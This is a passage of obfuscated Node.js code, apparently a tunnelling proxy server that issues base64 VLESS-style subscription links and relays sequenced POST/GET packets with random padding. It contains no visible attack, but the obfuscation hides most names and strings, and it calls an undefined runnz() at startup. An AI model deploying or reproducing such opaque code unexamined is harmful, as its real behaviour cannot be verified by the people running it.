_0x175bbb=_0x3d9e5e(0x1c0)+UUID+'@'+IP+':443?encryption=none&security=tls&sni='+IP+_0x3d9e5e(0x1e7)+IP+'&path='+SETTINGS[_0x3d9e5e(0x1f0)]+'&mode=packet-up#'+NAME+'-'+ISP,_0x33fc6a=Buffer[_0x3d9e5e(0x1af)](_0x175bbb)[_0x3d9e5e(0x223)]('base64');_0x13964e[_0x3d9e5e(0x1c9)](0xc8,{'Content-Type':_0x3d9e5e(0x1f7)}),_0x13964e[_0x3d9e5e(0x241)](_0x33fc6a+'\x0a');return;}const _0x2aaf65=_0x2ad134[_0x3d9e5e(0x23e)][_0x3d9e5e(0x1ab)](new RegExp(XPATH+_0x3d9e5e(0x1e3)));if(!_0x2aaf65){_0x13964e[_0x3d9e5e(0x1c9)](0x194),_0x13964e[_0x3d9e5e(0x241)]();return;}const _0x398863=_0x2aaf65[0x1],_0x37ee71=_0x2aaf65[0x2]?parseInt(_0x2aaf65[0x2]):null;if(_0x2ad134[_0x3d9e5e(0x1a9)]==='GET'&&!_0x37ee71){_0x287130['Content-Type']=_0x3d9e5e(0x21f),_0x287130[_0x3d9e5e(0x1db)]='chunked';let _0x1088c=sessions[_0x3d9e5e(0x192)](_0x398863);!_0x1088c&&(_0x1088c=new Session(_0x398863),sessions[_0x3d9e5e(0x1a5)](_0x398863,_0x1088c),log(_0x3d9e5e(0x22e),_0x3d9e5e(0x21c)+_0x398863));_0x1088c['downstreamStarted']=!![];!_0x1088c['startDownstream'](_0x13964e,_0x287130)&&(log(_0x3d9e5e(0x21e),_0x3d9e5e(0x1d1)+_0x398863),!_0x13964e[_0x3d9e5e(0x201)]&&(_0x13964e[_0x3d9e5e(0x1c9)](0x1f4),_0x13964e[_0x3d9e5e(0x241)]()),_0x1088c[_0x3d9e5e(0x1eb)](),sessions['delete'](_0x398863));return;}if(_0x2ad134[_0x3d9e5e(0x1a9)]==='POST'&&_0x37ee71!==null){let _0x59a940=sessions[_0x3d9e5e(0x192)](_0x398863);!_0x59a940&&(_0x59a940=new Session(_0x398863),sessions[_0x3d9e5e(0x1a5)](_0x398863,_0x59a940),log(_0x3d9e5e(0x22e),'Created\x20new\x20session\x20for\x20POST:\x20'+_0x398863),setTimeout(()=>{const _0x31434a=_0x3d9e5e,_0x399ba3=sessions[_0x31434a(0x192)](_0x398863);_0x399ba3&&!_0x399ba3[_0x31434a(0x1a3)]&&(log(_0x31434a(0x244),'Session\x20'+_0x398863+_0x31434a(0x18a)),_0x399ba3['cleanup'](),sessions[_0x31434a(0x1e4)](_0x398863));},SETTINGS[_0x3d9e5e(0x205)]));let _0x75966f=[],_0x5e6c66=0x0,_0x2b61b8=![];_0x2ad134['on'](_0x3d9e5e(0x1d4),_0x2b3502=>{const _0xc6add6=_0x3d9e5e;_0x5e6c66+=_0x2b3502[_0xc6add6(0x230)];if(_0x5e6c66>SETTINGS[_0xc6add6(0x19c)]){!_0x2b61b8&&(_0x13964e[_0xc6add6(0x1c9)](0x19d),_0x13964e[_0xc6add6(0x241)](),_0x2b61b8=!![]);return;}_0x75966f['push'](_0x2b3502);}),_0x2ad134['on'](_0x3d9e5e(0x241),async()=>{const _0x28c218=_0x3d9e5e;if(_0x2b61b8)return;try{const _0x16262a=Buffer['concat'](_0x75966f);log(_0x28c218(0x22e),'Processing\x20packet:\x20seq='+_0x37ee71+_0x28c218(0x245)+_0x16262a['length']),await _0x59a940[_0x28c218(0x215)](_0x37ee71,_0x16262a),!_0x2b61b8&&(_0x13964e[_0x28c218(0x1c9)](0xc8,_0x287130),_0x2b61b8=!![]),_0x13964e[_0x28c218(0x241)]();}catch(_0x2f14f5){log(_0x28c218(0x21e),_0x28c218(0x1ca)+_0x2f14f5[_0x28c218(0x208)]),_0x59a940[_0x28c218(0x1eb)](),sessions[_0x28c218(0x1e4)](_0x398863),!_0x2b61b8&&(_0x13964e[_0x28c218(0x1c9)](0x1f4),_0x2b61b8=!![]),_0x13964e[_0x28c218(0x241)]();}});return;}_0x13964e['writeHead'](0x194),_0x13964e[_0x3d9e5e(0x241)]();});server['on'](_0x5b1c85(0x1a0),_0x58a8e0=>{const _0xb3892a=_0x5b1c85;log('debug',_0xb3892a(0x1a8)+(_0x58a8e0[_0xb3892a(0x24d)]||'http/1.1'));});function generatePadding(_0x1f9af5,_0x27168c){const _0x5c223e=_0x5b1c85,_0x558c89=_0x1f9af5+Math[_0x5c223e(0x22c)](Math[_0x5c223e(0x233)]()*(_0x27168c-_0x1f9af5));return Buffer[_0x5c223e(0x1af)](Array(_0x558c89)[_0x5c223e(0x1c5)]('X')[_0x5c223e(0x24c)](''))[_0x5c223e(0x223)]('base64');}server['keepAliveTimeout']=0x975e0,server[_0x5b1c85(0x1da)]=0x98968,server['on']('error',_0x39496e=>{const _0x31b4a4=_0x5b1c85;log(_0x31b4a4(0x21e),'Server\x20error:\x20'+_0x39496e[_0x31b4a4(0x208)]);}),server['listen'](PORT,()=>{const _0x868937=_0x5b1c85;runnz(),console[_0x868937(0x20b)](_0x868937(0x240)+PORT);});
